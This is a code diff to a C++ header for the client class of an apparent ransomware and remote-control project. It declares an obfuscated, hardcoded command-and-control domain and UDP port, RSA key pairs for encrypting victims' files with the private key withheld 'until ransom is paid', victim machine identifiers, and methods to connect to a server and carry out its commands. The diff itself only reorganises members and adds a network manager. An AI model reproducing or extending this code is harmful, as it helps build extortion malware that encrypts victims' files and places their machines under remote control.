@@ -3,6 +3,7 @@
 #include "ProcessManager.h"
 #include "NetworkTypes.h"
 #include "External/obfuscate.h"
+#include "NetworkManager.h"
 
 const unsigned int UDP_PORT = 0x154E;
 const std::string  DNS_NAME = std::string(HIDE("logicgate-test.ddns.net"));
@@ -31,6 +32,13 @@ public:
     void               SetRequestSecrets(RSAKeys& keys) { this->m_RequestSecrets = keys; }
     void               SetRansomSecrets(RSAKeys& keys) { this->m_RansomSecrets = keys; }
 
+private:
+    std::string        m_ComputerName = "";       // remote host computer name. e.g DESKTOP-AJDU31S
+    std::string        m_MachineGUID = "";       // remote host windows machine guid. e.g 831js9fka29-ajs93j19sa82....    
+    RSAKeys            m_RequestSecrets = {};       // RSA key pair used to encrypt and decrypt requests to and from server
+    RSAKeys            m_RansomSecrets = {};       // RSA key pair used to encrypt and decrypt files. public key only stored on client until ransom is paid
+    SOCKET             m_TCPSocket = INVALID_SOCKET;
+
 #ifdef CLIENT_RELEASE                               // Client only methods
 public:
     Client();
@@ -39,9 +47,8 @@ public:
     BOOL               Connect();                   // Connect to the tcp server
     BOOL               Disconnect();                // Disconnect from the tcp server
     BYTESTRING         MakeTCPRequest(const ClientRequest& req, BOOL encrypted = FALSE); // send a message, receive the response
-    BOOL               SendMessageToServer(const Server& dest, ClientMessage message);
+    bool               SendMessageToServer(Server& dest, ClientMessage message);
     BOOL               SendMessageToServer(std::string message, BOOL encrypted = TRUE); // Send a encrypted string to TCP server
-    BOOL               SendEncryptedMessageToServer(const Server& dest, ClientMessage message);
     void               ListenForServerCommands();   // listen for commands from the server and perform them
     BOOL               PerformCommand(const Packet& command, ClientResponse& outResponse); // Perform a command from the tcp server
     const CMDDESC      CreateCommandDescription(const Packet& command);
@@ -54,13 +61,13 @@ private:
     BOOL               IsServerAwaitingResponse(const Packet& commandPerformed);
     BOOL               ExchangePublicKeys();        // send client public key, receive server public key
     Packet             OnEncryptedPacket(BYTESTRING encrypted); // on receive, decrypt and deserialize encrypted packet 
-    void               RespondToKeepAlive();
 
     ProcessManager     m_ProcMgr          = {};     // remote host process manager
     Server             m_TCPServerDetails = {};     // details describing the tcp server
     Server             m_UDPServerDetails = {};     // details about the UDP communication
     RSA*               m_ServerPublicKey  = {};
     SOCKET             m_UDPSocket        = INVALID_SOCKET;
+    NetworkManager     m_NetworkManager   = {};
 
 #elif defined(SERVER_RELEASE)                       // Server only client implementation
 public:
@@ -82,11 +89,4 @@ public:
     BOOL               KeepAliveProcess  = FALSE;
     BOOL               KeepAliveSuccess = FALSE;
 #endif
-
-private:
-    std::string        m_ComputerName = "";       // remote host computer name. e.g DESKTOP-AJDU31S
-    std::string        m_MachineGUID = "";       // remote host windows machine guid. e.g 831js9fka29-ajs93j19sa82....    
-    RSAKeys            m_RequestSecrets = {};       // RSA key pair used to encrypt and decrypt requests to and from server
-    RSAKeys            m_RansomSecrets = {};       // RSA key pair used to encrypt and decrypt files. public key only stored on client until ransom is paid
-    SOCKET             m_TCPSocket = INVALID_SOCKET;
 };
